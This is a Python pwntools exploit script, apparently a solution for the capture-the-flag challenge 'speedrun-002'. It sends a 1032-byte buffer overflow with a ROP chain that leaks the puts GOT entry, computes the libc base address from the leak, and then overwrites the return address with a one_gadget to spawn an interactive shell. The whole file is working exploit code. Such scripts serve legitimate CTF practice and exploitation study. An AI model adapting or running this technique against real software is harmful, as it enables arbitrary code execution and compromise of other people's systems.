from pwn import *
from sys import argv
from time import sleep

context.log_level = "INFO"

binfile = "./speedrun-002"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x4007ba
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 1032
payload += p64(0x4008a3)    # pop rdi ; ret  ;
payload += p64(0x601028)    # puts@got
payload += p64(0x4005b0)    # puts@plt
payload += p64(0x4007ce)

p.recvuntil("What say you now?\n")
p.send("Everything intelligent is so boring.")
p.recvuntil("Tell me more.\n")
p.send(payload)
p.recvuntil("\n")
puts_got = u64(p.recv(6).ljust(8, b"\x00"))
log.info("puts@got: 0x{:08x}".format(puts_got))
puts_off = 0x809c0
libc_base = puts_got - puts_off
log.info("libc_base: 0x{:08x}".format(libc_base))

one_shot = 0x4f322
one_gadget = libc_base + one_shot

payload2 = b""
payload2 += b"A" * 1032
payload2 += p64(one_gadget)

p.recvuntil("What say you now?\n")
p.send("Everything intelligent is so boring.")
p.recvuntil("Tell me more.\n")
p.send(payload2)

p.interactive()
